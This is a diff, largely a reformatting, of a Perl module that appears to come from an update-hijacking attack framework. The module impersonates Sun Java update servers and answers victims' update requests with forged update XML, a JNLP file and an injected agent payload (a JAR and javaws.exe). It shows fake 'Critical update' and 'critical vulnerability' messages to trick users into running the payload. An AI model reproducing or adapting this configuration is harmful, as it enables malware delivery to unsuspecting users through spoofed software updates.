@@ -25,109 +25,122 @@ package modules::sunjava;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'Sun Microsystems Java',
-    'version' => '1.0',
-    'appver' => '<= 1.6.0_28',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(java.sun.com|javadl-esd.sun.com)',
-    'request' => [
-		    {
-		    'req' => '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',
-		    'string' => '',
-		    'parse' => '',
-		    'file' => './include/sunjava/sunjava_map.xml'
-		    },
+my $base = {
+    'name'        => 'Sun Microsystems Java',
+    'version'     => '1.0',
+    'appver'      => '<= 1.6.0_28',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(java.sun.com|javadl-esd.sun.com)',
+    'request'     => [
+        {   'req' =>
+                '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)'
+            ,    #regex friendly
+            'type'   => 'file',    #file|string|agent|install
+            'method' => '',        #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '',
+            'file' => './include/sunjava/sunjava_map.xml'
+        },
 
-		    {
-		    'req' => '^/java_update.xml$', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/sunjava/sunjava_update.xml'
-		    },
+        {   'req'    => '^/java_update.xml$',    #regex friendly
+            'type'   => 'file',                  #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file' => './include/sunjava/sunjava_update.xml'
+        },
 
-		    {
-		    'req' => '^/java_update_seven.xml$', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/sunjava/sunjava_update_seven.xml'
-		    },
+        {   'req'    => '^/java_update_seven.xml$', #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file' => './include/sunjava/sunjava_update_seven.xml'
+        },
 
-		    {
-		    'req' => '/x.jnlp', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '',		    
-		    'string' => '',
-		    'parse' => '1',
-		    'file' => './include/sunjava/x.jnlp'
-		    },
-		    {
-		    'req' => '.jar', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,
-		    'string' => '',
-		    'parse' => '',
-		    'file' => ''
-		    },		    
+        {   'req'    => '/x.jnlp',                  #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '',
+            'string' => '',
+            'parse'  => '1',
+            'file'   => './include/sunjava/x.jnlp'
+        },
+        {   'req'    => '.jar',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '',
+            'file'   => ''
+        },
 
+        {   'req'    => '_seven.exe',               #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'bin'    => 1,
+            'method' => '',                         #any
+            'string' => '',
+            'parse'  => '',
+            'file' => './agent/java/javaws_seven.exe'
+        },
 
-		    {
-		    'req' => '_seven.exe', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'bin'    => 1,
-		    'method' => '', #any
-		    'string' => '',
-		    'parse' => '',
-		    'file' => './agent/java/javaws_seven.exe'
-		    },
-
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'bin'    => 1,
-		    'method' => '', #any
-		    'string' => '',
-		    'parse' => '',
-		    'file' => './agent/java/javaws.exe'
-		    },
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'file',                     #file|string|agent|install
+            'bin'    => 1,
+            'method' => '',                         #any
+            'string' => '',
+            'parse'  => '',
+            'file'   => './agent/java/javaws.exe'
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './include/sunjava/JavaPayload/FunnyClass2.jar', 
-		    		  'desc' => 'Agent to inject'},
-		    'arg'    => { 'val' => 'http://java.sun.com/x.jnlp"', 
-			    	  'desc' => 'Arg passed to Agent'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'name'  => { 'val' => "'javaupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
-                                'hidden' => 1,
-                        	'dynamic' =>1,},                                                    
-		    'title'  => { 'val' => 'Critical update',
-			    	  'desc' => 'Title name displayed in the update'},
-		    'description' => { 'val' => 'This critical update fix internal vulnerability',
-					'desc' => 'Description to be displayed during the update'},
-		    'atitle'  => { 'val' => 'Critical vulnerability',
-			    	   'desc' => 'Title name to be displayed in the systray item popup'},
-		    'adescription' => { 'val' => 'This critical update fix internal vulnerability',
-					'desc' => 'Description  to be displayed in the systray item popup'},
-		    'website' => { 'val' => 'http://java.com/moreinfolink',
-			    	   'desc' => 'Website displayed in the update'}
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' => {
+            'val'  => './include/sunjava/JavaPayload/FunnyClass2.jar',
+            'desc' => 'Agent to inject'
+        },
+        'arg' => {
+            'val'  => 'http://java.sun.com/x.jnlp"',
+            'desc' => 'Arg passed to Agent'
+        },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'name' => {
+            'val' =>
+                "'javaupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'title' => {
+            'val'  => 'Critical update',
+            'desc' => 'Title name displayed in the update'
+        },
+        'description' => {
+            'val'  => 'This critical update fix internal vulnerability',
+            'desc' => 'Description to be displayed during the update'
+        },
+        'atitle' => {
+            'val'  => 'Critical vulnerability',
+            'desc' => 'Title name to be displayed in the systray item popup'
+        },
+        'adescription' => {
+            'val'  => 'This critical update fix internal vulnerability',
+            'desc' => 'Description  to be displayed in the systray item popup'
+        },
+        'website' => {
+            'val'  => 'http://java.com/moreinfolink',
+            'desc' => 'Website displayed in the update'
+        }
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
